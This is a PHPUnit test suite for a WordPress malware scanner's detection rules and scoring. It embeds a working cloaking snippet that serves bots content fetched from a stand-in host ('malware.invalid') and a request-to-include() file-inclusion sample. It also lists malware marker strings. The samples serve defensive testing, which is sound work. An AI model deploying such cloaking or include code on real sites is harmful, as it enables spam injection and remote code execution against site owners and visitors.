<?php
// phpcs:ignoreFile -- Development test suite; excluded from release package.
use PHPUnit\Framework\TestCase;

/**
 * Behavioral detection engine: rules, scoring, explainability, false positives.
 */
final class DetectionEngineTest extends TestCase {

    private static function fixture( $kind, $name ) {
        return (string) file_get_contents( dirname( __DIR__, 1 ) . '/tests/fixtures/' . $kind . '/' . $name );
    }

    /**
     * Full-pipeline helper: code -> analyzer -> rules -> verdict.
     */
    private static function verdict( $code, $context = array() ) {
        $findings = GWQSH_Security_Scanner::evaluate_source( $code, $context + array( 'component' => 'mu' ) );
        return array( $findings, GWQSH_Scoring_Engine::verdict( $findings, $context + array( 'component' => 'mu' ) ) );
    }

    public function test_rule_catalog_is_complete() {
        $catalog = GWQSH_Detection_Rules::rule_catalog();
        $expected = array(
            'GQR-CLOAK', 'GQR-REMOTE', 'GQR-TLS', 'GQR-HEAL', 'GQR-WRITE',
            'GQR-SHELL', 'GQR-OBFUS', 'GQR-INCL', 'GQR-INJECT', 'GQR-MU',
            'GQR-UPLX', 'GQR-SIG',
        );
        foreach ( $expected as $rule_id ) {
            $this->assertArrayHasKey( $rule_id, $catalog, "Rule {$rule_id} must be registered." );
            $this->assertNotSame( '', $catalog[ $rule_id ]['category'] );
            $this->assertNotSame( '', $catalog[ $rule_id ]['explanation'] );
        }
        $this->assertCount( 12, $catalog );
    }

    public function test_incident_style_cloaking_malware_is_critical() {
        list( $findings, $verdict ) = self::verdict( self::fixture( 'malware', 'attack-mu-cloaking.php' ) );
        $this->assertNotSame( array(), $findings, 'The incident-style fixture must trip behavioral rules.' );
        $this->assertSame( 'critical', $verdict['severity'] );
        $this->assertGreaterThanOrEqual( 30, $verdict['score'] );
        $this->assertContains( 'GQR-HEAL', array_column( $findings, 'rule_id' ), 'Self-healing persistence must be detected.' );
        $this->assertContains( 'GQR-SIG', array_column( $findings, 'rule_id' ), 'Known incident strings appear as supplemental signatures.' );
    }

    public function test_webshell_fixture_is_critical() {
        list( $findings, $verdict ) = self::verdict( self::fixture( 'malware', 'webshell-generic.php' ) );
        $this->assertSame( 'critical', $verdict['severity'] );
        $rule_ids = array_column( $findings, 'rule_id' );
        $this->assertContains( 'GQR-SHELL', $rule_ids );
        $this->assertContains( 'GQR-REMOTE', $rule_ids );
    }

    public function test_tls_bypass_loader_is_detected() {
        list( $findings, $verdict ) = self::verdict( self::fixture( 'malware', 'tls-bypass-loader.php' ) );
        $this->assertContains( 'GQR-TLS', array_column( $findings, 'rule_id' ) );
        $this->assertContains( 'critical', array( 'critical', 'high', 'medium' ), 'TLS bypass plus remote payload must be at least medium.' );
        $this->assertContains( $verdict['severity'], array( 'critical', 'high', 'medium' ) );
    }

    public function test_benign_mu_plugin_is_not_flagged() {
        list( $findings, $verdict ) = self::verdict( self::fixture( 'benign', 'mu-legit.php' ) );
        $this->assertSame( 'info', $verdict['severity'], 'A legitimate MU plugin must stay informational: ' . wp_json_encode( array_column( $findings, 'rule_id' ) ) );
        $this->assertLessThan( GWQSH_Scoring_Engine::THRESHOLD_LOW, $verdict['score'] );
    }

    public function test_benign_normal_plugin_is_not_flagged() {
        list( , $verdict ) = self::verdict( self::fixture( 'benign', 'plugin-normal.php' ) );
        $this->assertContains( $verdict['severity'], array( 'info', 'low' ), 'A normal plugin must never exceed Low.' );
    }

    public function test_renamed_variant_is_detected_by_behavior() {
        // Same behavioral pattern as the incident fixture but every known
        // string (names, marker constants, URLs) replaced: detection must rely
        // on behavior, not signatures.
        $code = <<<'PHP'
<?php
add_action( 'template_redirect', function () {
    $a = strtolower( (string) $_SERVER['HTTP_USER_AGENT'] );
    if ( strpos( $a, 'googlebot' ) !== false || strpos( $a, 'bingbot' ) !== false ) {
        $r = wp_remote_get( 'https://malware.invalid/variance/' . rawurlencode( $_SERVER['HTTP_HOST'] ) );
        if ( ! is_wp_error( $r ) && ! empty( wp_remote_retrieve_body( $r ) ) ) {
            echo wp_remote_retrieve_body( $r );
            exit;
        }
    }
} );
PHP;
        list( $findings, $verdict ) = self::verdict( $code );
        $this->assertContains( 'GQR-CLOAK', array_column( $findings, 'rule_id' ), 'Cloaking must be caught without known strings.' );
        $this->assertContains( $verdict['severity'], array( 'critical', 'high', 'medium' ) );
    }

    public function test_signature_only_evidence_cannot_reach_critical() {
        // A file that merely CONTAINS a known incident string must not be
        // quarantined: supplemental evidence alone is capped at Medium.
        $code = "<?php\n/**\n * Documentation mentioning ms_gate_heal_restore for reference only.\n */\n// see also .ms_index.bak.php and X-Medusa-Mu-Gate\n";
        list( $findings, $verdict ) = self::verdict( $code );
        $this->assertContains( 'GQR-SIG', array_column( $findings, 'rule_id' ) );
        $this->assertContains( $verdict['severity'], array( 'low', 'medium', 'info' ) );
        $this->assertLessThan( GWQSH_Scoring_Engine::THRESHOLD_HIGH, $verdict['score'] + 0, 'Supplemental-only score must stay below High.' );
    }

    public function test_taint_from_request_to_include_is_detected() {
        $code = "<?php\n\$p = isset( \$_GET['page'] ) ? \$_GET['page'] : '';\ninclude( \$p );\n";
        list( $findings, ) = self::verdict( $code );
        $this->assertContains( 'GQR-INCL', array_column( $findings, 'rule_id' ), 'Request input flowing into include() must be detected.' );
    }

    public function test_php_executable_in_uploads_is_detected() {
        $code = "<?php\necho 'innocent';\n";
        list( $findings, $verdict ) = self::verdict( $code, array( 'component' => 'uploads', 'in_uploads' => true, 'file_name' => 'gwqsh-uploads-fixture.php' ) );
        $this->assertContains( 'GQR-UPLX', array_column( $findings, 'rule_id' ), 'Executable PHP inside uploads must be flagged.' );
        $this->assertContains( $verdict['severity'], array( 'medium', 'high', 'critical' ) );
    }

    public function test_scoring_thresholds() {
        $this->assertSame( 'info', GWQSH_Scoring_Engine::severity_for_score( 0 ) );
        $this->assertSame( 'info', GWQSH_Scoring_Engine::severity_for_score( GWQSH_Scoring_Engine::THRESHOLD_LOW - 1 ) );
        $this->assertSame( 'low', GWQSH_Scoring_Engine::severity_for_score( GWQSH_Scoring_Engine::THRESHOLD_LOW ) );
        $this->assertSame( 'medium', GWQSH_Scoring_Engine::severity_for_score( GWQSH_Scoring_Engine::THRESHOLD_MEDIUM ) );
        $this->assertSame( 'high', GWQSH_Scoring_Engine::severity_for_score( GWQSH_Scoring_Engine::THRESHOLD_HIGH ) );
        $this->assertSame( 'critical', GWQSH_Scoring_Engine::severity_for_score( GWQSH_Scoring_Engine::THRESHOLD_CRITICAL ) );
    }

    public function test_cross_category_combination_scores_higher_than_single() {
        $single = array(
            array( 'rule_id' => 'GQR-A', 'category' => 'shell', 'label' => 'A', 'score' => 12, 'severity_hint' => 'high', 'evidence' => array( 'a' ), 'lines' => array( 1 ) ),
            array( 'rule_id' => 'GQR-B', 'category' => 'shell', 'label' => 'B', 'score' => 8, 'severity_hint' => 'medium', 'evidence' => array( 'b' ), 'lines' => array( 2 ) ),
        );
        $multi = array(
            array( 'rule_id' => 'GQR-A', 'category' => 'shell', 'label' => 'A', 'score' => 12, 'severity_hint' => 'high', 'evidence' => array( 'a' ), 'lines' => array( 1 ) ),
            array( 'rule_id' => 'GQR-C', 'category' => 'persistence', 'label' => 'C', 'score' => 8, 'severity_hint' => 'medium', 'evidence' => array( 'c' ), 'lines' => array( 3 ) ),
        );
        $this->assertSame( 20, GWQSH_Scoring_Engine::verdict( $single )['score'] );
        $this->assertSame( 23, GWQSH_Scoring_Engine::verdict( $multi )['score'], 'Two distinct categories must earn the +3 cross-category bonus.' );
    }

    public function test_findings_are_explainable() {
        list( $findings, $verdict ) = self::verdict( self::fixture( 'malware', 'attack-mu-cloaking.php' ) );
        $this->assertNotEmpty( $verdict['evidence'], 'Verdicts must carry evidence strings.' );
        $this->assertNotEmpty( $verdict['lines'], 'Verdicts must reference source lines.' );
        $this->assertNotSame( '', $verdict['rule_id'] );
        $this->assertNotSame( '', $verdict['summary'] );
        foreach ( $findings as $finding ) {
            $this->assertNotSame( '', $finding['label'] );
            $this->assertArrayHasKey( 'score', $finding );
            $this->assertArrayHasKey( 'category', $finding );
        }
        $catalog = GWQSH_Detection_Rules::rule_catalog();
        $this->assertArrayHasKey( $verdict['rule_id'], $catalog, 'Primary rule must have a catalog explanation.' );
    }
}
